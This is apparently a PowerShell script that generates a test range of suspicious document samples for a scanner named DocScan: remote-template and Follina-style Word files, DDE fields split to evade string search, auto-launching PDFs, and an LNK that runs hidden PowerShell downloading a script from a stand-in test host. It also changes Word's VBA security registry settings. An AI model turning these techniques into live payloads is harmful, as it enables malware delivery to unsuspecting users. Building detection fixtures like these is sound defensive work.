$ErrorActionPreference='Stop'
Add-Type -AssemblyName System.IO.Compression.FileSystem
$R = "C:\docscan-build\range"
Remove-Item $R -Recurse -Force -ErrorAction SilentlyContinue
New-Item $R -ItemType Directory -Force | Out-Null
$U = "http://malware-test.local:8080"
$relsHdr = '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'

# allow programmatic VBA access
$sec='HKCU:\Software\Microsoft\Office\16.0\Word\Security'
New-Item -Path $sec -Force | Out-Null
Set-ItemProperty $sec AccessVBOM 1 -Type DWord
Set-ItemProperty $sec VBAWarnings 1 -Type DWord

$word = New-Object -ComObject Word.Application
$word.Visible = $false
$word.DisplayAlerts = 0

# ---- base clean .docx (real Word document) ----
$base = "$R\_base.docx"
$d = $word.Documents.Add()
$d.Content.Text = "DocScan benign test document."
$d.SaveAs2($base, 12)   # wdFormatXMLDocument (.docx)
$d.Close($false)

# ---- real macro-enabled docs (Word builds a genuine vbaProject.bin) ----
function New-MacroDoc($out, $code) {
  $doc = $word.Documents.Add()
  $m = $doc.VBProject.VBComponents.Add(1)
  $m.Name = "Module1"
  $m.CodeModule.AddFromString($code)
  if (Test-Path $out) { Remove-Item $out -Force }
  $doc.SaveAs2($out, 13)   # wdFormatXMLDocumentMacroEnabled (.docm)
  $doc.Close($false)
}
New-MacroDoc "$R\macro_suspicious.docm" "Sub AutoOpen()`r`n    Dim s As String`r`n    s = ""powershell""`r`n    s = ""DownloadFile""`r`n    s = ""CreateObject""`r`n    ' inert test`r`nEnd Sub"
New-MacroDoc "$R\vendor_shellexec.docm" "Sub AutoOpen()`r`n    Dim t As String`r`n    t = ""ShellExecute""`r`n    t = ""GetObject""`r`n    t = ""00A0C91F3880""`r`n    t = ""C08AFD90""`r`n    ' inert test`r`nEnd Sub"
$word.Quit()
[void][Runtime.InteropServices.Marshal]::ReleaseComObject($word)

# ---- zip-injection helpers (inject the attack into a real Word docx) ----
function Add-TextEntry($zip, $name, $text) {
  $e = $zip.Entries | Where-Object { $_.FullName -eq $name }
  if ($e) { $e.Delete() }
  $ne = $zip.CreateEntry($name)
  $sw = New-Object IO.StreamWriter($ne.Open())
  $sw.Write($text); $sw.Close()
}
function Add-BinEntry($zip, $name, [byte[]]$bytes) {
  $e = $zip.Entries | Where-Object { $_.FullName -eq $name }
  if ($e) { $e.Delete() }
  $ne = $zip.CreateEntry($name)
  $bw = New-Object IO.BinaryWriter($ne.Open())
  $bw.Write($bytes); $bw.Close()
}
function Get-EntryText($zip, $name) {
  $e = $zip.Entries | Where-Object { $_.FullName -eq $name }
  if (-not $e) { return $null }
  $sr = New-Object IO.StreamReader($e.Open()); $t = $sr.ReadToEnd(); $sr.Close(); return $t
}
function New-Injected($out, [scriptblock]$inject) {
  Copy-Item $base $out -Force
  $zip = [IO.Compression.ZipFile]::Open($out, 'Update')
  try { & $inject $zip } finally { $zip.Dispose() }
}

# remote template (T1221)
New-Injected "$R\remote_template.docx" {
  param($zip)
  Add-TextEntry $zip "word/_rels/settings.xml.rels" ($relsHdr + '<Relationship Id="rT" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="' + $U + '/t.dotx" TargetMode="External"/></Relationships>')
}
# Follina protocol handler
New-Injected "$R\protocol_handler.docx" {
  param($zip)
  Add-TextEntry $zip "word/_rels/document.xml.rels" ($relsHdr + '<Relationship Id="rP" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="ms-msdt:/id PCWDiagnostic /skip force /param TEST" TargetMode="External"/></Relationships>')
}
# external OLE (MEDIUM)
New-Injected "$R\external_ole.docx" {
  param($zip)
  Add-TextEntry $zip "word/_rels/document.xml.rels" ($relsHdr + '<Relationship Id="rO" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="' + $U + '/o.bin" TargetMode="External"/></Relationships>')
}
# DDEAUTO
New-Injected "$R\dde_auto.docx" {
  param($zip)
  $doc = Get-EntryText $zip "word/document.xml"
  $fld = '<w:p><w:fldSimple w:instr=" DDEAUTO c:\\Windows\\System32\\notepad.exe TEST "/></w:p>'
  $doc = $doc -replace '</w:body>', ($fld + '</w:body>')
  Add-TextEntry $zip "word/document.xml" $doc
}
# DDE (not AUTO): runs a command once the user accepts the link-update prompt
New-Injected "$R\dde_link.docx" {
  param($zip)
  $doc = Get-EntryText $zip "word/document.xml"
  $fld = '<w:p><w:fldSimple w:instr=" DDE c:\\Windows\\System32\\cmd.exe /c notepad.exe TEST "/></w:p>'
  $doc = $doc -replace '</w:body>', ($fld + '</w:body>')
  Add-TextEntry $zip "word/document.xml" $doc
}
# DDEAUTO split over two instrText runs (evades plain string search)
New-Injected "$R\dde_split.docx" {
  param($zip)
  $doc = Get-EntryText $zip "word/document.xml"
  $fld = '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>' +
         '<w:r><w:instrText xml:space="preserve"> DDE</w:instrText></w:r>' +
         '<w:r><w:instrText xml:space="preserve">AUTO c:\\Windows\\System32\\cmd.exe "/c notepad.exe" </w:instrText></w:r>' +
         '<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>TEST</w:t></w:r>' +
         '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'
  $doc = $doc -replace '</w:body>', ($fld + '</w:body>')
  Add-TextEntry $zip "word/document.xml" $doc
}
# (Excel DDE samples: gen_test_range.py -> excel_dde_formula.xlsx, excel_ddelink.xlsx)
# embedded PE
New-Injected "$R\embedded_pe.docx" {
  param($zip)
  $mz = New-Object byte[] 256
  $mz[0]=0x4D; $mz[1]=0x5A; $mz[0x3C]=0x80; $mz[0x80]=0x50; $mz[0x81]=0x45
  Add-BinEntry $zip "word/embeddings/oleObject1.bin" $mz
}
# embedded LNK
New-Injected "$R\embedded_lnk.docx" {
  param($zip)
  $sig = [byte[]](0x4C,0,0,0,0x01,0x14,0x02,0,0,0,0,0,0xC0,0,0,0,0,0,0,0x46)
  $all = New-Object byte[] 84
  [Array]::Copy($sig, $all, 20)
  Add-BinEntry $zip "word/embeddings/oleObject1.bin" $all
}

# ---- non-Office formats (real files) ----
[IO.File]::WriteAllText("$R\rtf_objupdate.rtf", '{\rtf1\ansi {\object\objupdate\objemb {\*\objdata 0105}}}')
[IO.File]::WriteAllText("$R\pdf_js_auto.pdf", "%PDF-1.5`n1 0 obj<</OpenAction<</S/JavaScript/JS(app.launchURL('$U'))>>>>endobj`ntrailer<</Root 1 0 R>>`n%%EOF")
[IO.File]::WriteAllText("$R\pdf_launch.pdf", "%PDF-1.5`n1 0 obj<</OpenAction<</S/Launch/F(cmd.exe)>>>>endobj`ntrailer<</Root 1 0 R>>`n%%EOF")

# LNK (lolbin + url args + obfuscation)
$target = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$argline = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('$U/a.ps1')"
$h = New-Object byte[] 0x4C
[BitConverter]::GetBytes([int]0x4C).CopyTo($h, 0)
([byte[]](0x01,0x14,0x02,0,0,0,0,0,0xC0,0,0,0,0,0,0,0x46)).CopyTo($h, 4)
[BitConverter]::GetBytes([int](0x02 -bor 0x20)).CopyTo($h, 0x14)
$pathBytes = [Text.Encoding]::ASCII.GetBytes($target)
$lbpOff = 28
$liSize = $lbpOff + $pathBytes.Length + 1
$li = New-Object byte[] $liSize
[BitConverter]::GetBytes([int]$liSize).CopyTo($li, 0)
[BitConverter]::GetBytes([int]28).CopyTo($li, 4)
[BitConverter]::GetBytes([int]1).CopyTo($li, 8)
[BitConverter]::GetBytes([int]$lbpOff).CopyTo($li, 16)
$pathBytes.CopyTo($li, $lbpOff)
$aBytes = [Text.Encoding]::ASCII.GetBytes($argline)
$sd = New-Object byte[] (2 + $aBytes.Length)
[BitConverter]::GetBytes([uint16]$aBytes.Length)[0..1].CopyTo($sd, 0)
$aBytes.CopyTo($sd, 2)
$lnk = New-Object byte[] ($h.Length + $li.Length + $sd.Length)
$h.CopyTo($lnk, 0); $li.CopyTo($lnk, $h.Length); $sd.CopyTo($lnk, $h.Length + $li.Length)
[IO.File]::WriteAllBytes("$R\lnk_lolbin.lnk", $lnk)

Remove-Item $base -Force
Write-Output "RANGE:"
Get-ChildItem $R | Select-Object -Expand Name | Sort-Object
